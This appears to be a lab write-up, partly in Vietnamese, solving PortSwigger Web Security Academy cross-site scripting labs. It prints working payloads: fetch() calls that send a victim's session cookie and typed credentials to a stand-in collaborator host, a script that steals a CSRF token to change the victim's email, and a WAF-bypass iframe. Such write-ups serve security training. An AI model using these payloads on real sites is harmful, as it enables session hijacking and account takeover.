# [Portswigger] Cross-site scripting
***

## 1. Lab: Reflected XSS into HTML context with nothing encoded
* Content:
```
This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function.
```
* Exploit:

<img width="379" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/40b02cef-ed0e-4437-a80a-534d4b0a8ab2">

<img width="227" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7304d580-c21d-4aaa-b367-1a49c6b8abd6">

***

## 2. Lab: Exploiting cross-site scripting to steal cookies

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.
```
* Exploit:

Post comment như sau:

```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

<img width="374" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1a29c93e-410b-4981-ad59-ceaddca4a6b8">

Burp Collaborator đã log lại được comment body chứa cookie:

<img width="451" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4a98f157-1034-46f7-8ba3-6d2adf4de7e4">

Dùng cookie này truy cập được vào phiên của admin. Lab Solved!

***

## 3. Lab: Exploiting cross-site scripting to capture passwords

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.
```
* Exploit:

Post comment nội dung như sau:

Payload:
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

<img width="389" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/8a825082-958a-42ad-8c08-6d90320b5b26">

Nếu victim nhập thông tin vào thì sẽ bị gửi về server attacker:

<img width="422" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/a8977118-46ec-4c88-b509-22a612587c13">

Thu được thông tin user/pass của administrator:

<img width="448" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7e5f5653-48a4-46e6-ba0c-399ee441c964">

Lab Solved!

***

## 4. Lab: Exploiting XSS to perform CSRF

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter

Learning path
If you're following our suggested learning path, please note that this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.
```
* Exploit: 

Đăng nhập vào và check chức năng đổi mail => Sử dụng link `POST /my-account/change-email` với Data truyền vào là `email=wiener%40admin-user.net&csrf=smqFjQb05gI9NpKJ3xwDdifJ8fT1z5vM` 

<img width="373" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/6aa2cfe4-8cee-48cd-8b7a-d03ee8e453bd">

=> Data có bao gồm `token` => Vậy để khiến cho người dùng khác tự đổi password => Cần phải trigger cho user này vào link `/my-account` và bắt lại response chứa thông tin token => Đưa vào request thực hiện đổi Email.

<img width="482" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/bf4f73d5-db18-4837-882b-16f9d2a21fee">

Soạn nội dung comment như sau:
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

<img width="371" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9f257b2e-8c2a-4e97-946d-59e21c2d90a9">

Lab Solved! => User nào thấy nội dung comment trên sẽ bị đổi email thành `test@test.com`

***

## 5. Lab: Reflected XSS into HTML context with most tags and attributes blocked
* Content:
```
This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

Note
Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.
```
* Exploit: 

Ban đầu thử truyền thẻ img vào tính năng search thấy bị chặn

<img width="474" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/bba85424-2af3-40a8-b7c3-8562edf70708">

Chuyển request sang Intruder và đặt Positions như sau:

<img width="585" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/831804af-e53e-4c76-9cca-25dc64d7f9e1">

Phần Payloads thì copy all tags từ trang cheat sheet (`https://portswigger.net/web-security/cross-site-scripting/cheat-sheet`)

<img width="579" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/d338b755-bba7-4b15-a1e1-7b9f27589aaa">

Paste vào phần simple list:

<img width="251" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/618c7545-aadf-46c5-9701-b86d2289b168">

Thực hiện Start attack

<img width="420" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b36fc8c4-e010-4f72-a059-b8628d8e375d">

=> Phát hiện có thẻ `body` là không bị chặn.

Tiếp tục tìm xem Event handle nào bị chặn

Chỉnh Positions:

<img width="583" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/561156fe-cb4a-4550-a9c4-8359dc6c243e">

Copy phần Events trong Cheat Sheet vào phần Payloads. => Thực hiện Start Attack:

Xác định được ác Events sau không bị filter => Ta chọn sử dụng hàm `onresize`

<img width="423" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b80a547e-d010-4648-a112-b571061c575c">

Sử dụng đoạn code sau trên Exploit Server

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

Deliver to victim => Lab Solved!

<img width="597" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/da3e1c91-33af-43b4-8c3b-a85f795d5295">

***

## 6. 



